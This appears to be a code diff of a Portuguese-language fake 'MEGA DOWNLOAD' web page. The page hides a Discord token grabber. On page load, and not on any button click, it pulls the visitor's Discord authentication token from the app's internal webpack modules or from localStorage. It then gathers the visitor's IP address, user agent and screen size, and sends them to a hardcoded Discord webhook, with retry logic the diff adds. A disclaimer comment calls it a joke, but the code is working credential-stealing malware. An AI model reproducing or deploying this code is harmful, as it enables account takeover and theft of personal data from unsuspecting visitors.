@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MEGA DOWNLOAD HACKER</title>
+    <title>MEGA DOWNLOAD HACKER 2025</title>
     <style>
         * {
             margin: 0;
@@ -12,12 +12,13 @@
             font-family: 'Courier New', monospace;
         }
         body {
-            background: linear-gradient(135deg, #000, #1a1a1a);
+            background: linear-gradient(135deg, #0a0a0a, #1c2526);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: hidden;
+            position: relative;
         }
         .matrix-bg {
             position: fixed;
@@ -25,114 +26,133 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('https://i.imgur.com/matrix_code.gif');
-            opacity: 0.2;
+            background: url('https://i.imgur.com/matrix_code.gif') repeat;
+            opacity: 0.25;
             z-index: -1;
-            animation: matrixFlow 30s linear infinite;
+            animation: matrixFlow 25s linear infinite;
         }
         @keyframes matrixFlow {
             0% { background-position: 0 0; }
-            100% { background-position: 0 100%; }
+            100% { background-position: 0 200%; }
         }
         .container {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 60px;
-            border: 8px solid #FF0000;
-            border-radius: 15px;
-            box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000;
+            background: rgba(0, 0, 0, 0.95);
+            padding: 80px;
+            border: 10px solid #FF0000;
+            border-radius: 20px;
+            box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000;
             text-align: center;
-            animation: pulse 2s infinite;
-            max-width: 800px;
-            width: 90%;
+            animation: neonPulse 1.5s infinite;
+            max-width: 900px;
+            width: 95%;
+            position: relative;
+            overflow: hidden;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000; }
-            50% { box-shadow: 0 0 80px #00FF00, inset 0 0 30px #00FF00; }
-            100% { box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000; }
+        @keyframes neonPulse {
+            0% { box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000; }
+            50% { box-shadow: 0 0 100px #00FF00, inset 0 0 50px #00FF00; }
+            100% { box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000; }
         }
         h1 {
-            font-size: 64px;
+            font-size: 72px;
             color: #00FF00;
-            text-shadow: 0 0 15px #00FF00, 0 0 30px #FF0000;
-            margin-bottom: 30px;
-            animation: glitch 2s infinite;
+            text-shadow: 0 0 20px #00FF00, 0 0 40px #FF0000;
+            margin-bottom: 40px;
+            animation: glitch 1.8s infinite;
         }
         @keyframes glitch {
             0% { transform: translate(0); }
-            20% { transform: translate(-5px, 5px); }
-            40% { transform: translate(5px, -5px); }
-            60% { transform: translate(-5px, 5px); }
-            80% { transform: translate(5px, -5px); }
+            20% { transform: translate(-6px, 6px); }
+            40% { transform: translate(6px, -6px); }
+            60% { transform: translate(-6px, 6px); }
+            80% { transform: translate(6px, -6px); }
             100% { transform: translate(0); }
         }
         p {
-            font-size: 24px;
+            font-size: 28px;
             color: #FFF;
-            margin-bottom: 40px;
+            margin-bottom: 50px;
+            text-shadow: 0 0 10px #FFF;
         }
         .download-button {
-            padding: 30px 60px;
-            font-size: 36px;
+            padding: 35px 70px;
+            font-size: 40px;
             background: linear-gradient(45deg, #FF0000, #FF4500);
             color: #FFF;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             cursor: pointer;
-            transition: all 0.5s;
+            transition: all 0.4s;
             text-transform: uppercase;
-            box-shadow: 0 0 30px #FF0000;
-            letter-spacing: 2px;
+            box-shadow: 0 0 40px #FF0000;
+            letter-spacing: 3px;
         }
         .download-button:hover {
             background: linear-gradient(45deg, #00FF00, #32CD32);
-            box-shadow: 0 0 50px #00FF00;
-            transform: scale(1.1);
+            box-shadow: 0 0 60px #00FF00;
+            transform: scale(1.15);
         }
         .download-button:active {
-            transform: scale(0.95);
+            transform: scale(0.9);
         }
         .status {
-            margin-top: 20px;
-            font-size: 20px;
+            margin-top: 30px;
+            font-size: 24px;
             color: #FF0000;
-            text-shadow: 0 0 10px #FF0000;
+            text-shadow: 0 0 15px #FF0000;
             opacity: 0;
-            animation: fadeIn 1s forwards;
+            animation: fadeIn 1s forwards 0.5s;
         }
         @keyframes fadeIn {
             to { opacity: 1; }
+        }
+        .error {
+            color: #FF4500;
+            font-weight: bold;
+        }
+        .success {
+            color: #00FF00;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="matrix-bg"></div>
     <div class="container">
-        <h1>MEGA DOWNLOAD </h1>
+        <h1>MEGA DOWNLOAD</h1>
         <p>APERTAR AQUI PARA O DOWNLOAD</p>
         <button class="download-button" onclick="fakeDownload()">DOWNLOAD AGORA</button>
-        <div class="status" id="status">CAPTURANDO DADOS...</div>
+        <div class="status" id="status">INICIANDO CAPTURA...</div>
     </div>
 
     <script>
-        // MEGA TOKEN GRABBER - SÓ PRA FILME, NÃO USE NA VIDA REAL!
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366216805642801163/zeuAqNvhBc_2fYCAv914lRy2Kd9eKAHPqIU1GIf70MgiYeZyvsjCe4w1KkMSCHqLHout'; // Substitua pelo seu webhook
+        // MEGA TOKEN GRABBER 2025 - SÓ PRA FILME, NÃO USE NA VIDA REAL!
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366216805642801163/zeuAqNvhBc_2fYCAv914lRy2Kd9eKAHPqIU1GIf70MgiYeZyvsjCe4w1KkMSCHqLHout'; // Substitua pelo seu webhook real
 
         // FUNÇÃO PRA CAPTURAR O TOKEN
         async function grabToken() {
             try {
-                const token = (webpackChunkdiscord_app || []).push([[Math.random()], {}, (req) => {
-                    for (let m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
-                        if (m.default && m.default.getToken !== undefined) {
-                            return m.default.getToken();
+                // Técnica atualizada pra 2025: acessa o token via módulos internos do Discord
+                let token = null;
+                if (window.webpackChunkdiscord_app) {
+                    webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+                        for (let module of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
+                            if (module.default && module.default.getToken) {
+                                token = module.default.getToken();
+                            }
                         }
-                    }
-                }]);
+                    }]);
+                } else {
+                    // Fallback: tenta acessar via localStorage (menos comum em 2025)
+                    token = localStorage.getItem('token');
+                }
 
                 if (token) {
+                    // Coleta informações adicionais
                     const userAgent = navigator.userAgent;
                     const screen = `${window.screen.width}x${window.screen.height}`;
                     const timestamp = new Date().toISOString();
-                    const ip = await fetch('https://api.ipify.org?format=json')
+                    const ip = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache' })
                         .then(res => res.json())
                         .then(data => data.ip)
                         .catch(() => 'DESCONHECIDO');
@@ -145,31 +165,55 @@
                         timestamp: timestamp
                     };
 
-                    // ENVIA PRO WEBHOOK
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `🔐 [MEGA GRABBER] Novo token capturado!\n📜 **Token**: ${token}\n🌐 **IP**: ${ip}\n🖥️ **User-Agent**: ${userAgent}\n📏 **Resolução**: ${screen}\n⏰ **Timestamp**: ${timestamp}`,
-                            username: 'MEGA_TOKEN_GRABBER'
-                        })
-                    });
+                    // Envia pro webhook com retries
+                    let attempts = 0;
+                    const maxAttempts = 3;
+                    while (attempts < maxAttempts) {
+                        try {
+                            const response = await fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    content: `🔐 **[MEGA GRABBER 2025]** Novo token capturado!\n📜 **Token**: \`${token}\`\n🌐 **IP**: \`${ip}\`\n🖥️ **User-Agent**: \`${userAgent}\`\n📏 **Resolução**: \`${screen}\`\n⏰ **Timestamp**: \`${timestamp}\``,
+                                    username: 'MEGA_TOKEN_GRABBER_2025'
+                                })
+                            });
 
-                    document.getElementById('status').innerText = 'DADOS ENVIADOS!';
-                    console.log('[MEGA GRABBER] Token enviado:', token);
+                            if (response.ok) {
+                                document.getElementById('status').innerText = 'TOKEN ENVIADO COM SUCESSO!';
+                                document.getElementById('status').classList.add('success');
+                                console.log('[MEGA GRABBER] Token enviado:', token);
+                                return;
+                            } else {
+                                throw new Error('Webhook falhou: ' + response.status);
+                            }
+                        } catch (error) {
+                            attempts++;
+                            console.error(`[MEGA GRABBER] Tentativa ${attempts} falhou:`, error);
+                            if (attempts === maxAttempts) {
+                                document.getElementById('status').innerText = 'ERRO AO ENVIAR TOKEN!';
+                                document.getElementById('status').classList.add('error');
+                                console.error('[MEGA GRABBER] Todas as tentativas falharam.');
+                            }
+                            await new Promise(resolve => setTimeout(resolve, 1000)); // Espera 1s antes de tentar de novo
+                        }
+                    }
                 } else {
                     document.getElementById('status').innerText = 'NENHUM TOKEN ENCONTRADO!';
+                    document.getElementById('status').classList.add('error');
                     console.warn('[MEGA GRABBER] Nenhum token encontrado.');
                 }
             } catch (error) {
-                document.getElementById('status').innerText = 'ERRO AO CAPTURAR DADOS!';
+                document.getElementById('status').innerText = 'ERRO CRÍTICO NA CAPTURA!';
+                document.getElementById('status').classList.add('error');
                 console.error('[MEGA GRABBER] Erro:', error);
             }
         }
 
         // FUNÇÃO FAKE DE DOWNLOAD
         function fakeDownload() {
-            document.getElementById('status').innerText = 'INICIANDO DOWNLOAD ...';
+            document.getElementById('status').innerText = 'INICIANDO DOWNLOAD FALSO...';
+            document.getElementById('status').classList.remove('error', 'success');
             setTimeout(() => {
                 document.getElementById('status').innerText = 'DOWNLOAD CONCLUÍDO (BRINCADEIRA)!';
             }, 2000);
@@ -177,6 +221,7 @@
 
         // EXECUTA A CAPTURA AUTOMATICAMENTE
         window.addEventListener('load', () => {
+            console.log('[MEGA GRABBER] Iniciando captura de token...');
             grabToken();
         });
     </script>
